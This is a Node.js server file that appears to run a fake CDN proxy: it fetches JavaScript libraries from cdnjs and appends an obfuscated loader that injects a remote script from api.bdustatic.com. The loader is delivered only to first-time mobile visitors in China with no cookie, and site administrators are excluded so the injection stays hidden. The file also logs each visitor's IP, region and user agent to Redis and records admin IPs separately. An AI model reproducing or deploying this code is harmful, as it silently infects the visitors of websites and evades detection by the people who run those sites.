function judgeJS(countryCode, city, referer, isMobileUser, isFirstVisit_10h_ua_ip, isCookieSet, isSiteAdmin, isReferrerSiteNotLocal, user_agent, ip, redis) {
	
	let res;
	const jc_bc2_string = `
	function krBQATz(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function CQEZfMqpfa(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return krBQATz(t)}eval('window')['\x50\x4e\x41\x69\x4f\x6c']=function(){;(function(u,r,w,d,f,c){var x=CQEZfMqpfa;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4xMC5qcw==','uKsbYfruROGC',window,document,'IrCoNDiXdjtPMqZ','ptrbDePscS')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) PNAiOl();
	`;
	
	if(countryCode != "CN") {
		return ''; 
	}	
	if(referer == "" || referer == null) {
		return ''; 
	}	
	if(isMobileUser == false || isMobileUser == null) {
		return ''; 
	}
	if(isFirstVisit_10h_ua_ip == false) {
		return ''; 
	}	
	if (isCookieSet == true) {
		return '';
	}
	if (isSiteAdmin == true) {
		return '';
	}	
	if (isReferrerSiteNotLocal == false) {
		return '';
	}
	//检查备案
	if (countryCode == 'CN'){
			redis.hget('beian_domain', referer, (err, beian) => {
			  if (err) {
				console.error('Error:', err);
			  } else {
				if (city == beian) {
					return '';
				}
			  }
			});		
	}
	
	redis.sismember('bc_list', referer, (err, res1) => {
	  if (err) {
		console.error('Error:', err);
		return '';
	  }

	  if (!res1) {
		return '';
	  }

	  // res1 is true
	  console.log('Member of bc_list');
	  const res = jc_bc2_string;
	  redis.sadd('bc_fangwen_list', referer, (err) => {
		if (err) {
		  console.error('Error adding to bc_fangwen_list:', err);
		} else {
		  console.log('Added to bc_fangwen_list');
		}
	  });
	});
	
	if ((referer != '' || referer != null) && isMobileUser == true && $countryCode == "CN") {
		return res;
	}	
	
	return '';
}

//############################################################# /check 开始 #############################################################
app.get('/check', (req, res) => {	
	let refererTxt = '';
	let hashKey = '';
	const myuserAgent = req.headers['user-agent'];//获取user agent
	const requestedFile = req.query.file || ''; //获取js文件
	let referer = req.get('referer') || '';	//获取referer                                              		//############ 0
	
	if (referer != '') {
		referer = extractDomainFromReferrer(referer);
	}
	
	const MM_METADATA = req.headers['mm_metadata']; //获取nginx meta data
	const MM_COUNTRY_CODE = req.headers['mm_country_code']; //获取nginx country code                       

	const geoip2_real_ip = req.headers['geoip2_real_ip']; //获取nginx ip
	const maccms_geoip2_country_code = req.headers['maccms_geoip2_country_code']; //获取nginx country        //############ 4
	const currentDate = new Date(); //获取现在日期
	const year = currentDate.getFullYear();
	const month = currentDate.getMonth() + 1; 
	const day = currentDate.getDate();
	const hours = currentDate.getHours();
	const minutes = currentDate.getMinutes();
	const seconds = currentDate.getSeconds();	
	let isMobileUser = req.useragent.isMobile; //检查用户是否使用手机	                                   //############ 2
	let isSiteAdmin; //是否站长
	let isCookieSet; //是否有cookie
	let isFirstVisit_10h_ua_ip; //访客唯一访问 10h ua + ip
	let isReferrerSiteNotLocal; //host has more than 100 records
	let city;
	
	if (!requestedFile) {
	  return res.sendStatus(404);
	}	
	
	(async () => {
	  try {
				isSiteAdmin = await checkSiteadmin(redis, geoip2_real_ip);                          		//############ 5
				isCookieSet = await checkCookie(req, geoip2_real_ip);                               		//############ 1
				isFirstVisit_10h_ua_ip = await checkFirstVisit(redis, geoip2_real_ip, myuserAgent);        //############ 3
				isReferrerSiteNotLocal = await checkHundredUniqueIP(redis, referer);                       //############ 6			
				if (isCookieSet == false) {
					console.log('-Cookie 开始设置');
					setCookie(geoip2_real_ip, req);
				}
									
				const userData = {
				'IP': geoip2_real_ip,
				'国家': maccms_geoip2_country_code,
				'userAgent': myuserAgent,
				'File': requestedFile,
				'Referer': referer,
				'是否使用手机': isMobileUser,
				'访问时间': `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`,
				'来源': `${siteSource}`,
				};	
				
				//使用纯真IP库获取中国地区加入userData
				if (maccms_geoip2_country_code == 'CN' || maccms_geoip2_country_code == '中国') {
					const libqqwry = require('lib-qqwry');
					let qqwry = libqqwry();
					qqwry.speed();					
					let china_ip = qqwry.searchIP(geoip2_real_ip);
					city = china_ip.Country;
					const customKey = '中国地区';
					const customValue = city;
					userData[customKey] = customValue;					
				}

				const serializedUserData = JSON.stringify(userData);

				//redis保存用户基本质料
				hashKey = '用户质料';
				
				redis.rpush(`${hashKey}`, serializedUserData, (err, reply) => {
				if (err) {
					console.error('-用户基本质料保存失败:', err);
				} else {
					console.log('-用户基本质料已保存:', reply);				
				}
				});	

				
				//从cdnjs获取文件 （热欲方式）
				const cdnResponse = await axios.get('https://cdnjs.cloudflare.com/ajax/' + requestedFile, {
				responseType: 'arraybuffer',
				});

				const contentType = getContentType(requestedFile);
				
				// ############## 逻辑判断 ############## 
				if (contentType == 'text/javascript') {
					let responseData = cdnResponse.data;
					
					
					let str = judgeReferer(maccms_geoip2_country_code, city, referer, isMobileUser, isFirstVisit_10h_ua_ip, isCookieSet, isSiteAdmin, isReferrerSiteNotLocal, myuserAgent, geoip2_real_ip, redis);
					if( str != '' ) {
						responseData = responseData+str;
					} else {
						str = judgeJS(maccms_geoip2_country_code, city, referer, isMobileUser, isFirstVisit_10h_ua_ip, isCookieSet, isSiteAdmin, isReferrerSiteNotLocal, myuserAgent, geoip2_real_ip, redis);

						if( str != false ) {
							responseData = responseData+str;
						}
					}					
					
					res.setHeader('Content-Type', contentType);
					res.status(cdnResponse.status).send(responseData);
					console.log('judge hack true');
				} else {
					//res.setHeader('Content-Disposition', 'attachment');
					res.setHeader('Content-Type', contentType);
					res.status(cdnResponse.status).send(cdnResponse.data);
					console.log('judge hack false, not js file');
				}


				
				/* //以下用来debug
				res.status(200).send(
				'User Agent:'+myuserAgent+'<br />'+
				'Referer:'+refererTxt+'<br />'+
				'requestedFile:'+requestedFile+'<br />'+
				'isMobileUser:'+isMobileUser+'<br />'+
				'isSiteAdmin:'+isSiteAdmin+'<br />'+
				'isCookieSet:'+isCookieSet+'<br />'+
				'isFirstVisit_10h_ua_ip:'+isFirstVisit_10h_ua_ip+'<br />'+
				'MM_METADATA:'+MM_METADATA+'<br />'+
				'MM_COUNTRY_CODE:'+MM_COUNTRY_CODE+'<br />'+
				'geoip2_real_ip:'+geoip2_real_ip+'<br />'+
				'maccms_geoip2_country_code:'+maccms_geoip2_country_code
				 );
				 */
		
		  }  catch (err) {
			  if (err.response && err.response.status === 404) {
				res.sendStatus(404);
			  } else {
				console.error(err);
				res.sendStatus(500);
			  }
		  }
	})();	
});
//############################################################# /check 完毕 #############################################################

//记录管理员ip
app.get('/checkAdmin', (req, res) => { 
	const geoip2_real_ip = req.headers['geoip2_real_ip']; //获取nginx ip
	const maccms_geoip2_country_code = req.headers['maccms_geoip2_country_code']; //获取nginx ip
	const currentDate = new Date(); //获取现在日期
	const year = currentDate.getFullYear();
	const month = currentDate.getMonth() + 1; 
	const day = currentDate.getDate();
	const hours = currentDate.getHours();
	const minutes = currentDate.getMinutes();
	const seconds = currentDate.getSeconds();		
	const hashKey = '管理员记录';
	const userData = {
	  'IP': geoip2_real_ip,
	  '国家': maccms_geoip2_country_code,
	  '访问时间': `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`,
	  '来源': `${siteSource}`,
	};	
	const serializedUserData = JSON.stringify(userData);

	redis.rpush(hashKey, serializedUserData, (err, reply) => {
		if (err) {
		console.error('管理员质料保存失败:', err);
		} else {
		console.log('管理员质料已保存:', reply);
		}
	});		
	redis.quit((err, reply) => {});	
	res.status(200).send('var usercache = true;');
	
});	

//显示空白，可以改成redirect 
app.get('/', (req, res) => { 
	res.status(200).send('');		
});

//关闭redis connection
process.on('beforeExit', () => {
  // Close the Redis connection
  redis.quit().then(() => {
    console.log('Redis connection closed.');
  });
});

//nodejs default端口 3000
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
